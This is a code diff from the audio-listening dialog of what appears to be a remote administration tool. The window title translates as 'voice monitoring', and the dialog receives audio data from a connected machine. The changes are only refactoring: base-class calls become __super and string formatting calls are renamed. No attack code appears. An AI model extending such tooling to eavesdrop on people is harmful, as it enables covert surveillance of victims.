@@ -31,7 +31,7 @@ CAudioDlg::~CAudioDlg()
 
 void CAudioDlg::DoDataExchange(CDataExchange* pDX)
 {
-    CDialog::DoDataExchange(pDX);
+    __super::DoDataExchange(pDX);
     DDX_Check(pDX, IDC_CHECK, m_bSend);
 }
 
@@ -47,12 +47,12 @@ END_MESSAGE_MAP()
 
 BOOL CAudioDlg::OnInitDialog()
 {
-    CDialog::OnInitDialog();
+    __super::OnInitDialog();
 
     SetIcon(m_hIcon,FALSE);
 
     CString strString;
-    strString.Format("%s - 语音监听", m_IPAddress);
+    strString.FormatL("%s - 语音监听", m_IPAddress);
     SetWindowText(strString);
 
     BYTE bToken = COMMAND_NEXT;
@@ -93,7 +93,7 @@ void CAudioDlg::OnReceiveComplete(void)
 {
     m_nTotalRecvBytes += m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;   //1000+ =1000 1
     CString	strString;
-    strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
+    strString.FormatL("Receive %d KBytes", m_nTotalRecvBytes / 1024);
     SetDlgItemText(IDC_TIPS, strString);
     switch (m_ContextObject->InDeCompressedBuffer.GetBYTE(0)) {
     case TOKEN_AUDIO_DATA: {
